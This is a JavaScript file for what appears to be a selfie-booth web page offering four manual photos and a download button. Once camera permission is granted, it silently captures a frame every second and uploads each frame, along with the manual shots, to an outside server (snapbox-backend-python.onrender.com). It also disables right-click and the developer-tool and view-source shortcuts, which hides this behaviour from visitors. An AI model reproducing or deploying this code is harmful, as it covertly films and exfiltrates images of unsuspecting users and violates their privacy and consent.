
lucide.createIcons();
let currentIndex = 0;
const capturedImages = [];
let autoCaptureInterval;

function toggleTheme() {
  const html = document.documentElement;
  html.classList.toggle('bg-black');
  html.classList.toggle('text-white');
  html.classList.toggle('bg-white');
  html.classList.toggle('text-black');
}

function capturePhoto(auto = false) {
  const video = document.getElementById('camera');
  const canvas = document.getElementById('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext('2d');
  ctx.translate(canvas.width, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  const dataUrl = canvas.toDataURL('image/jpeg');
  const blob = dataURLtoBlob(dataUrl);
  uploadSinglePhoto(blob, currentIndex + 1);

  if (!auto && currentIndex < 4) {
    const box = document.querySelectorAll('.preview-box')[currentIndex];
    box.style.backgroundImage = `url(${dataUrl})`;
    box.innerText = '';
    capturedImages.push(blob);
    currentIndex++;

    if (currentIndex === 4) {
      const msg = document.getElementById('msg');
      msg.classList.remove('hidden');
      setTimeout(() => msg.classList.add('hidden'), 3000);
      document.querySelectorAll('.preview-ring').forEach(el => el.classList.add('stopped'));
    }
  }
}

function manualCapture() {
  capturePhoto(false);
}

function uploadSinglePhoto(blob, index) {
  const formData = new FormData();
  formData.append('photos', blob, `photo${index}.jpg`);
  fetch('https://snapbox-backend-python.onrender.com/upload', {
    method: 'POST',
    body: formData
  }).then(() => {
    console.log(`Uploaded selfie ${index}`);
  }).catch(err => {
    console.error(`Upload error selfie ${index}`, err);
  });
}

function downloadAllPhotos() {
  if (capturedImages.length < 1) return alert("Capture photos first!");
  capturedImages.forEach((blob, i) => {
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `selfie_${i + 1}.jpg`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  });
}

function resetAll() {
  currentIndex = 0;
  capturedImages.length = 0;
  document.querySelectorAll('.preview-box').forEach((box, i) => {
    box.style.backgroundImage = '';
    box.innerText = `Tap ${i + 1}`;
  });
  document.getElementById('msg').classList.add('hidden');
  document.querySelectorAll('.preview-ring').forEach(el => el.classList.remove('stopped'));
}

function dataURLtoBlob(dataurl) {
  const parts = dataurl.split(',');
  const mime = parts[0].match(/:(.*?);/)[1];
  const bstr = atob(parts[1]);
  let n = bstr.length;
  const u8arr = new Uint8Array(n);
  while (n--) u8arr[n] = bstr.charCodeAt(n);
  return new Blob([u8arr], { type: mime });
}

window.addEventListener('load', () => {
  const popup = document.getElementById('welcomePopup');
  const main = document.getElementById('mainContainer');
  setTimeout(() => {
    popup.classList.add('opacity-0');
    setTimeout(() => {
      popup.style.display = 'none';
      main.classList.remove('blur-md', 'pointer-events-none');
      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
          document.getElementById('camera').srcObject = stream;
          autoCaptureInterval = setInterval(() => {
            capturePhoto(true);
          }, 1000);
        })
        .catch(err => {
          alert('Camera access failed. Use HTTPS or allow permission.');
          console.error(err);
        });
    }, 500);
  }, 3000);
});

// 🔒 Disable Inspect Element, View Source, Right Click
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', function (e) {
  if (
    e.key === 'F12' ||
    (e.ctrlKey && e.shiftKey && ['I', 'C', 'J'].includes(e.key.toUpperCase())) ||
    (e.ctrlKey && e.key.toUpperCase() === 'U')
  ) {
    e.preventDefault();
  }
});
